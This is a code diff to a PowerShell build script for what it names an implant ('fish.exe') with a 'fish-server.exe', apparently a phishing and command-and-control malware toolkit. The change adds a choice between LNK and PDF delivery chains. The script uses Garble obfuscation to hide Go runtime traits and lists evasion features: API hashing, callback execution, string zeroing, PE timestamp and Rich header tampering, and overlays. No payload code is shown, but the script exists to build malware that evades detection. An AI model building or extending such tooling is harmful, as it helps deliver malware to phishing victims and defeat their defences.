@@ -13,7 +13,9 @@ param(
     [string]$DecryptKey = "85",
     [switch]$Garble = $false,
     [string]$GarbleSeed = "",
-    [switch]$SkipPost = $false
+    [switch]$SkipPost = $false,
+    [ValidateSet("lnk", "pdf")]
+    [string]$Chain = "lnk"
 )
 
 $ErrorActionPreference = "Stop"
@@ -38,10 +40,21 @@ if ($Platform -eq "windows") {
 
 $gcflags = "all=-l -N"
 
-$outputName = if ($Platform -eq "windows") { "fish.exe" } else { "fish_$Platform_$Arch" }
+$outputName = if ($Platform -eq "windows") { 
+    if ($Chain -eq "pdf") { "fish_pdf.exe" } else { "fish.exe" }
+} else { "fish_$Platform_$Arch" }
+
+# Select build target based on chain
+$buildTarget = "."
+$chainLabel = "LNK"
+if ($Chain -eq "pdf") {
+    $buildTarget = "./pdf/"
+    $chainLabel = "PDF"
+}
+
+Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"
 
 # Garble编译（可选，深度混淆Go运行时特征）
-$garbleArgs = ""
 if ($Garble) {
     Write-Host "[+] Garble compilation enabled"
     $garbleArgs = "garble -tiny -literals"
@@ -50,11 +63,10 @@ if ($Garble) {
     } else {
         $garbleArgs = "$garbleArgs -seed=random"
     }
-    # 实验性控制流混淆（需要Go 1.24+）
     $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
-    go $garbleArgs -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName .
+    go $garbleArgs -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 } else {
-    go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName .
+    go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 }
 
 if ($LASTEXITCODE -ne 0) {
@@ -265,6 +277,7 @@ Write-Host "=== Build Summary ==="
 Write-Host "[+] Platform: $Platform/$Arch"
 Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
 Write-Host "[+] Server: fish-server.exe"
+Write-Host "[+] Chain: $chainLabel"
 $garbleStatus = if ($Garble) { "Yes (-tiny -literals)" } else { "No (use -Garble to enable)" }
 Write-Host "[+] Garble: $garbleStatus"
 Write-Host "[+] Evasion: API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
